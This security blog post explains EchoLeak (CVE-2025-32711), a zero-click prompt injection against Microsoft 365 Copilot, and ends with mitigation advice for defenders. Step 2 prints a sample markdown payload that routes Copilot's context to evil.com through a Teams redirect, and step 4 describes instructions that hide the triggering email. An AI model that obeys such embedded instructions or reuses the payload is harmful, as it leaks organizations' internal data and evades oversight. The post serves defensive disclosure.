---
layout: post
title: "This Is Not a Drill: EchoLeak (CVE-2025-32711) and the First Real-World Zero-Click LLM Attack"
date: 2025-06-25
categories: [AI Security, Prompt Injection]
tags: [ai-threats, data-exfiltration, cve-2025-32711, copilot, microsoft-365, rag-vulnerabilities, llm-attack-surface]
---

## EchoLeak: CVE-2025-32711 and the Rise of Zero‑Click LLM Exploits

In June 2025, a critical vulnerability dubbed **EchoLeak** (CVE‑2025‑32711) was disclosed that affects Microsoft 365 Copilot. It represents one of the first *zero-click* prompt injection attacks in an LLM-powered system and serves as a wake-up call about the reality of untrusted AI inputs.
<!--more-->

Official CVE entries for more details:

- [NVD: CVE‑2025‑32711](https://nvd.nist.gov/vuln/detail/CVE-2025-32711)  
- [Microsoft Security Response Center: CVE‑2025‑32711](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711)

---

## What is EchoLeak?

CVE‑2025‑32711 is a critical AI command injection flaw (CVSS 9.3) in Microsoft 365 Copilot. Attackers can embed hidden prompts within emails, which Copilot processes automatically—*without any user interaction*—to exfiltrate internal organizational data.

---

## How the Exploit Works

1. **Malicious email content**  
   The attacker sends a normal-looking email into the target’s inbox. It contains no obvious signs of malicious intent and passes through standard filters.

2. **Hidden instructions via Markdown**  
   The email includes a concealed exfiltration prompt that instructs the model to fetch a redirect URL embedding internal context. When Copilot parses the markdown, it unknowingly leaks sensitive data. For example:
   ```markdown
   [ref]: https://teams.microsoft.com/redirect?to=https://evil.com?leak={{copilot_context}}
   ![alt text][ref]
   ```
   This syntax appears benign but causes the model to leak internal context via query parameters.

3. **Zero-click exfiltration**  
   Copilot, during its background summarization tasks, automatically parses the email and resolves the embedded link—triggering the data leak without any user interaction.

4. **No trace left behind**  
   Some variants of the attack include instructions telling Copilot not to reference the triggering email in its reply, making detection and logging more difficult.

---

## Why It Matters

- **Completely zero-click**: No user prompt or interaction needed.
- **Filter evasion**: Benign-looking Markdown bypassed standard security controls.
- **High-impact exfiltration**: Access to Outlook, Teams, SharePoint, and more.
- **Scope violation**: Demonstrates how RAG boundaries and AI filters can be bypassed by creative injection.

---

## Key SecOps Takeaways

EchoLeak proves that prompt injection isn't theoretical—it’s here and it's weaponized. Here are strategies to mitigate this class of risk:

- **Treat all inputs as hostile**: Sanitize and filter AI inputs, not just outputs.
- **Enforce context boundaries**: Limit RAG scope and audit retrieval logic.
- **Restrict model browsing**: Architect LLMs to avoid untrusted content fetches.
- **Monitor LLM behavior**: Log and alert on unusual model-driven network calls or redirects.
- **Red-team for prompt injection**: Traditional red-teaming often ignores LLMs—but with AI integrated into critical systems, security teams must treat them like any other attack surface. Simulate realistic prompt injection attempts using emails, markdown, code snippets, and adversarial inputs that test how your LLM agents process and act on external content.

Prompt injection is a real and growing threat. As enterprises rely more on LLMs, security teams must build prompt hygiene into system design and defenses.

---

*Sources: NVD, Microsoft Security Response Center, The Hacker News, SOC Prime, Field Effect Security Intelligence.*

---

> Exploiting data. Securing AI. Living between the tokens and the dead prompts.
